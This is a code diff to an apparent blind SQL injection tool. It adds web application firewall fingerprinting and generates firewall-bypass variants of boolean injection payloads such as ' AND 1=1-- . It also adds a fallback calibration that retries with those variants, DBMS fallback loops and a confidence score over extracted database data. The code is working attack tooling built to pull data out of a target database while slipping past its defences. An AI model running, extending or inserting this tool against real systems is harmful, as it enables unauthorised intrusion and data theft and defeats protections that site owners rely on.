@@ -5,6 +5,13 @@ from enum import Enum
 from tools.log_utils import get_logger
 from tools.http_client import build_url
 from tools.settings import settings
+from tools.verification_oracle import ConfidenceVoter
+
+try:
+    from tools.waf_bypass import fingerprint_waf
+    HAS_WAF = True
+except Exception:
+    HAS_WAF = False
 
 logger = get_logger("sqli_blind")
 
@@ -127,7 +134,7 @@ class ResponseClassifier:
         self.min_time_diff = 0.0
 
     def calibrate(self, url: str, param: str, true_payload: str,
-                  false_payload: str) -> bool:
+                  false_payload: str, waf_bypass_variants: List[str] = None) -> bool:
         try:
             start = time.time()
             r1 = self.sess.get(build_url(url, param, true_payload),
@@ -137,7 +144,21 @@ class ResponseClassifier:
             self.baseline_time = time.time() - start
         except Exception as e:
             logger.debug("calibrate true: %s", e)
-            return False
+            if waf_bypass_variants:
+                for variant in waf_bypass_variants[:5]:
+                    try:
+                        start = time.time()
+                        r1 = self.sess.get(build_url(url, param, variant),
+                                           timeout=self.timeout)
+                        self.true_len = len(r1.text)
+                        self.true_text = r1.text
+                        self.baseline_time = time.time() - start
+                        true_payload = variant
+                        break
+                    except Exception:
+                        continue
+            if self.true_len == 0:
+                return False
 
         try:
             r2 = self.sess.get(build_url(url, param, false_payload),
@@ -150,6 +171,16 @@ class ResponseClassifier:
 
         self.calibrated = True
         return True
+
+    def calibrate_with_baseline(self, url: str, param: str,
+                                sess: "requests.Session", timeout: float) -> bool:
+        try:
+            r = sess.get(build_url(url, param, "1"), timeout=timeout)
+            self.baseline_len = len(r.text)
+            self.baseline_text = r.text
+            return True
+        except Exception:
+            return False
 
     def is_true(self, url: str, param: str, payload: str) -> Optional[bool]:
         if not self.calibrated:
@@ -393,7 +424,8 @@ class BlindInjector:
         return None
 
     def _try_dbms_queries(self, url: str, param: str, dbms: str,
-                           result: Dict) -> bool:
+                           result: Dict,
+                           waf_bypass_variants: List[str] = None) -> bool:
         self.dbms = dbms
         dbms_query_map = {
             "mysql": MYSQL_QUERIES,
@@ -409,7 +441,7 @@ class BlindInjector:
         true_payload = "' AND 1=1-- "
         false_payload = "' AND 1=2-- "
 
-        if self.classifier.calibrate(url, param, true_payload, false_payload):
+        if self.classifier.calibrate(url, param, true_payload, false_payload, waf_bypass_variants):
             self.tech = BlindTech.BOOLEAN
             self.baseline_time = self._measure_baseline(url, param)
             result["technique"] = "boolean"
@@ -466,11 +498,39 @@ class BlindInjector:
 
         return False
 
+    def _compute_confidence(self, result: Dict) -> Dict:
+        voter = ConfidenceVoter()
+        if result.get("vulnerable") and result.get("data"):
+            data_entries = len(result["data"])
+            voter.add_vote("data_extracted", min(0.5 + data_entries * 0.1, 0.9))
+            if result.get("technique") == "boolean":
+                if self.classifier.calibrated:
+                    true_false_gap = abs(self.classifier.true_len - self.classifier.false_len)
+                    if true_false_gap > 30:
+                        voter.add_vote("bool_length_gap", 0.7)
+                    elif true_false_gap > 10:
+                        voter.add_vote("bool_length_gap", 0.5)
+            if result.get("technique") == "time":
+                base = self.baseline_time if self.baseline_time > 0 else 0.3
+                if base > 0 and self.sleep_time * 0.7 / base > 2:
+                    voter.add_vote("time_confidence", 0.75)
+            if result.get("technique") == "error":
+                voter.add_vote("error_extract", 0.85)
+            if result.get("dbms"):
+                voter.add_vote("dbms_identified", 0.4)
+            if data_entries >= 2:
+                voter.add_vote("multi_field", 0.5)
+        result["confidence_score"] = round(voter.score, 2)
+        result["confidence"] = voter.level.value
+        result["confidence_votes"] = voter.evidence()
+        return result
+
     def run(self, url: str, param: str,
             queries: Dict[str, str] = None,
             forced_dbms: str = None,
             max_len: int = 32,
-            parallel: bool = True) -> Dict:
+            parallel: bool = True,
+            waf_name: Optional[str] = None) -> Dict:
         self.max_len = max_len
         result = {
             "vulnerable": False,
@@ -478,22 +538,34 @@ class BlindInjector:
             "technique": None,
             "data": {},
             "error": None,
+            "waf_detected": waf_name,
         }
+
+        waf_bypass_variants = []
+        if waf_name and HAS_WAF:
+            from tools.waf_bypass import generate_sqli_payloads
+            for raw in ["' AND 1=1-- ", "' AND 1=2-- "]:
+                variants = generate_sqli_payloads(raw, waf_name, max_payloads=5)
+                waf_bypass_variants.extend(v["payload"] for v in variants if v.get("payload"))
+            self.classifier.calibrate_with_baseline(url, param, self.sess, self.timeout)
 
         detected_dbms = forced_dbms or self._auto_detect_dbms(url, param)
         if detected_dbms:
-            if self._try_dbms_queries(url, param, detected_dbms, result):
+            if self._try_dbms_queries(url, param, detected_dbms, result, waf_bypass_variants):
+                self._compute_confidence(result)
                 return result
 
         for fallback in ["mysql", "mssql", "postgresql", "oracle"]:
             if fallback == detected_dbms:
                 continue
             logger.debug("trying fallback DBMS: %s", fallback)
-            if self._try_dbms_queries(url, param, fallback, result):
+            if self._try_dbms_queries(url, param, fallback, result, waf_bypass_variants):
+                self._compute_confidence(result)
                 return result
 
         if not result["data"]:
             result["error"] = "Could not detect DBMS or extract data with any template"
+        self._compute_confidence(result)
         return result
 
 
@@ -557,10 +629,21 @@ def check_oob_dns(url: str, param: str, oob_domain: str,
 
 def check(url: str, param: str, sess: Optional["requests.Session"] = None,
           timeout: float = 10.0, post_body: bool = False,
-          post_data: dict = None) -> Dict:
+          post_data: dict = None,
+          waf_name: Optional[str] = None,
+          auto_detect_waf: bool = True) -> Dict:
     if sess is None:
         import requests
         sess = requests.Session(); sess.verify = settings.verify_ssl
+
+    if waf_name is None and auto_detect_waf and HAS_WAF:
+        try:
+            waf_info = fingerprint_waf(url, sess, timeout)
+            waf_name = waf_info.get("name")
+            if waf_name:
+                logger.info("sqli_blind detected WAF: %s", waf_name)
+        except Exception:
+            pass
 
     injector = BlindInjector(sess, timeout)
 
@@ -570,6 +653,11 @@ def check(url: str, param: str, sess: Optional["requests.Session"] = None,
         "database": MYSQL_QUERIES.get("database", "DATABASE()"),
     }
 
-    result = injector.run(url, param, queries)
+    result = injector.run(url, param, queries, waf_name=waf_name)
+
+    if "confidence_score" not in result:
+        result["confidence_score"] = 0.0
+        result["confidence"] = "low"
+        result["confidence_votes"] = []
 
     return result
